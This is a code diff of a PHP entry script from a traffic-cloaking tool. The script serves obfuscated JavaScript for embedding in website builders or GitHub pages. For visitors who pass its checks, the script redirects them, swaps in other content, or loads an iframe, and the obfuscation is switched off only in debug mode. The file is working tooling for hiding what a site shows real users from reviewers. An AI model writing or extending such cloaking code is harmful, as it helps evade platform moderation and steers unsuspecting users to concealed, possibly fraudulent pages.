@@ -1,21 +1,35 @@
 <?php
-//Этот файл необходимо подключить к любому конструктору, используя
-//следующий код: <script src="https://ваш.домен/js/index.php"></script>
-//в случае прохождения пользователем проверки, будет совершено действие, которое
-//вы указали для js-подключения: редирект, подмена или показ iframe
-global $use_js_checks, $js_obfuscate;
+//This file must be included if you want to connect the cloaker using Javascript.
+//This works good for any website builders or GitHub for example.
+//Use the following code: <script src="https://your.domain/js/index.php"></script>
+//If the user passes the verification, the action you specified for the JS connection in campaign settings
+//will be performed: 
+//1.redirect 
+//2.content substitution 
+//3.show iframe
 require_once __DIR__.'/obfuscator.php';
+require_once __DIR__.'/../db.php';
+require_once __DIR__.'/../debug.php';
 require_once __DIR__.'/../settings.php';
 require_once __DIR__.'/../requestfunc.php';
-if ($use_js_checks) {
+require_once __DIR__.'/../config/Campaign.php';
+
+$db = new Db();
+$dbCamp = $db->get_campaign_by_domain($_SERVER['HTTP_HOST']);
+if ($dbCamp===null)
+    die("NO CAMPAIGN FOR THIS DOMAIN!");
+//TODO create a trafficback campaign option
+
+$c = new Campaign($dbCamp);
+if ($c->white->jsChecks->enabled) {
     header('Content-Type: text/javascript');
     $jsCode= str_replace('{DOMAIN}', get_cloaker_path(), file_get_contents(__DIR__.'/connect.js'));
-    if ($js_obfuscate) {
+    if (DebugMethods::$on){
+        echo $jsCode;
+    } else {
         $hunter = new HunterObfuscator($jsCode);
         echo $hunter->Obfuscate();
-    } else {
-        echo $jsCode;
     }
 } else {
-    include 'process.php';
+    include __DIR__.'/process.php';
 }
